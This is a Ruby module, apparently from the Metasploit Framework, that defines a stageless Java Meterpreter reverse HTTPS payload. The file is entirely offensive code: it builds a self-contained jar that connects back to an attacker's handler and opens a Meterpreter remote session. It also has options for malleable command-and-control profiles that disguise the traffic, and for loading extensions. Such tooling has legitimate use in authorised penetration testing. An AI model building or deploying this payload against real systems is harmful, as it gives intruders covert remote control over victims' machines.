##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Java::ReverseHttps
  include Msf::Payload::Java::MeterpreterLoader

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Java Meterpreter, Reverse HTTPS Stageless',
        'Description' => 'Run a meterpreter server in Java. Reverse HTTPS. Self-contained jar.',
        'Author' => ['mihi', 'egypt', 'OJ Reeves'],
        'Platform' => 'java',
        'Arch' => ARCH_JAVA,
        'Handler' => Msf::Handler::ReverseHttps,
        'License' => MSF_LICENSE,
        'Session' => Msf::Sessions::Meterpreter_Java_Java
      )
    )

    register_options([
      OptString.new('MALLEABLEC2', [false, 'Path to a file containing the malleable C2 profile']),
      OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load'])
    ])
  end

  def generate_jar(opts = {})
    super(opts.merge(stageless: true, c2_profile: datastore['MALLEABLEC2'], extensions: (datastore['EXTENSIONS'] || '').split(',')))
  end
end
